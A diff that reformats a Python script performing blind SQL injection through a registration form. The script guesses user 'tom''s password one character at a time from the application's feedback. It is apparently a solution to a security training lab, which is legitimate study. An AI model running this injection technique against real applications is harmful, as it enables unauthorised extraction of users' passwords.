@@ -28,14 +28,15 @@ def get_password(cookie):
             break
 
     while True:
-        query = f'tom\' AND EXISTS (select * from {table_name} WHERE USERID = \'tom\' AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}\')--'
+        query = f'tom\' AND EXISTS (select * from {table_name} WHERE USERID = \'tom\' ' \
+                f'AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}\')--'
         print(query)
         no_of_queries += 1
         data = {
             'username_reg': query,
             'email_reg': 'paul@gmail.com',
             'password_reg': 'paul123',
-            'confirm_password_reg': 'paul123'
+            'confirm_password_reg': 'paul123',
         }
 
         r = requests.put(URL, headers=headers, data=data)
@@ -43,10 +44,15 @@ def get_password(cookie):
         try:
             response = json.loads(r.text)
         except:
-            print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
+            print(
+                "Wrong JSESSIONID, find it by looking at your requests once logged in."
+            )
             return
 
-        if "already exists please try to register with a different username" not in response['feedback']:
+        if (
+            "already exists please try to register with a different username"
+            not in response['feedback']
+        ):
             alphabet_index += 1
             if alphabet_index > len(alphabet) - 1:
                 pickle.dump(password, open("outputs/password.pkl", "wb"))
